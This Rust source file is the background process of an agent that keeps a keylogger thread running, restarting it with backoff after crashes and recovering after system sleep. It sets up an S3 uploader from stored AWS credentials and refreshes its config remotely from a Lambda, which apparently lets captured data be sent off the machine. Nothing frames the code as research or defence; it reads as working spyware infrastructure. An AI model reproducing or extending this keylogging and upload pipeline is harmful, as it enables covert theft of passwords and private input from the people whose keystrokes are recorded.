// src/process/background.rs
use crate::tasks::{process_all_tasks};
use crate::utils::instance::ensure_single_instance;
use std::error::Error;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};
use log::{error, info, debug, warn};
use crate::tracker::TaskTracker;
use crate::config::{get_config_from_lambda, ConfigAws};
use crate::logsetup::logging::cleanup_old_logs;
use crate::RUNNING;
use crate::s3upload::S3Uploader;
use crate::tasks::processor::TaskProcessor;
use crate::awscnf::credentials::CredentialsManager;
use tokio::sync::Mutex;
use anyhow::{Result, Context};

pub async fn start_background_process() -> Result<()> {
    let _lock_file = ensure_single_instance()
        .map_err(|e| anyhow::anyhow!("Failed to acquire single instance lock: {}", e))?;

    // Global shared state
    let global_running = Arc::new(AtomicBool::new(true));
    let config_mutex = Arc::new(Mutex::new(ConfigAws::default()));

    // Log cleanup thread
    {
        let running_clone = global_running.clone();
        thread::spawn(move || {
            while running_clone.load(Ordering::SeqCst) {
                if let Err(e) = cleanup_old_logs("config/config.toml") {
                    error!("Log cleanup failed: {}", e);
                }
                thread::sleep(Duration::from_secs(24 * 60 * 60));
            }
        });
    }

    // Ctrl-C handler
    {
        let running_clone = global_running.clone();
        ctrlc::set_handler(move || {
            info!("Received shutdown signal");
            running_clone.store(false, Ordering::SeqCst);
            RUNNING.store(false, Ordering::SeqCst);
        }).context("Failed to set ctrl-c handler")?;
    }

    // Initialize credentials and S3 uploader
    let credentials_manager = CredentialsManager::new();
    let aws_creds = credentials_manager.get_credentials()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to get AWS credentials: {}", e))?;

    let s3_uploader = S3Uploader::new(
        aws_creds.region,
        &aws_creds.bucket_name,
        &aws_creds.access_key,
        &aws_creds.secret_key
    ).await
        .map_err(|e| anyhow::anyhow!("Failed to initialize S3 uploader: {}", e))?;

    // Persistent task processor
    let task_processor = Arc::new(Mutex::new(TaskProcessor::new(s3_uploader)
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create task processor: {}", e))?));

    let task_tracker = TaskTracker::new();

    // Improved Keylogger thread with sleep-safe restart
    {
        let running_clone = global_running.clone();
        thread::spawn(move || {
            let mut consecutive_failures = 0;
            const MAX_CONSECUTIVE_FAILURES: u32 = 5;
            const INITIAL_BACKOFF: Duration = Duration::from_secs(1);
            const MAX_BACKOFF: Duration = Duration::from_secs(60);

            while running_clone.load(Ordering::SeqCst) {
                let start_time = Instant::now();

                let result = std::panic::catch_unwind(|| {
                    crate::keylogger::start_keylogging()
                });

                match result {
                    Ok(_) => {
                        // Successful run, reset failure count
                        consecutive_failures = 0;
                    }
                    Err(e) => {
                        // Log the specific error
                        error!("Keylogger thread panicked: {:?}", e);
                        consecutive_failures += 1;

                        // Exponential backoff with jitter
                        let backoff = INITIAL_BACKOFF * 2u32.pow(consecutive_failures.min(5));
                        let jittered_backoff = backoff + Duration::from_millis(rand::random::<u64>() % 1000);

                        // Cap the maximum backoff time
                        let sleep_duration = jittered_backoff.min(MAX_BACKOFF);

                        // Additional check for excessive failures
                        if consecutive_failures >= MAX_CONSECUTIVE_FAILURES {
                            error!("Keylogger repeatedly failed. Pausing thread.");
                            break;
                        }

                        thread::sleep(sleep_duration);
                    }
                }

                // Prevent tight spinning if the operation is very quick
                let elapsed = start_time.elapsed();
                if elapsed < Duration::from_millis(100) {
                    thread::sleep(Duration::from_millis(100) - elapsed);
                }
            }

            warn!("Keylogger thread exiting.");
        });
    }

    // Main background task loop
    let mut last_config_check = Instant::now();
    let mut last_system_active = SystemTime::now();

    while global_running.load(Ordering::SeqCst) && RUNNING.load(Ordering::SeqCst) {
        let current_time = SystemTime::now();

        // Sleep detection and recovery
        if let Ok(elapsed) = current_time.duration_since(last_system_active) {
            if elapsed > Duration::from_secs(120) {
                warn!("System appears to have been sleeping. Performing recovery...");
                task_processor.lock().await.reset_timers();
                last_system_active = current_time;
            }
        }
        last_system_active = current_time;

        // Periodic config refresh
        if last_config_check.elapsed() >= Duration::from_secs(120) {
            match get_config_from_lambda().await {
                Ok(new_config) => {
                    *config_mutex.lock().await = new_config;
                    last_config_check = Instant::now();
                },
                Err(e) => error!("Config refresh failed: {}", e),
            }
        }

        // Process tasks
        let current_config = config_mutex.lock().await.clone();

        if let Err(e) = process_all_tasks(&current_config, &task_tracker).await {
            error!("All tasks processing failed: {}", e);
        }

        if let Err(e) = task_processor.lock().await.process_tasks(&current_config).await {
            error!("Scheduled tasks processing failed: {}", e);
        }

        // Prevent tight loop
        tokio::time::sleep(Duration::from_secs(30)).await;
    }

    info!("Background process shutting down gracefully");
    Ok(())
}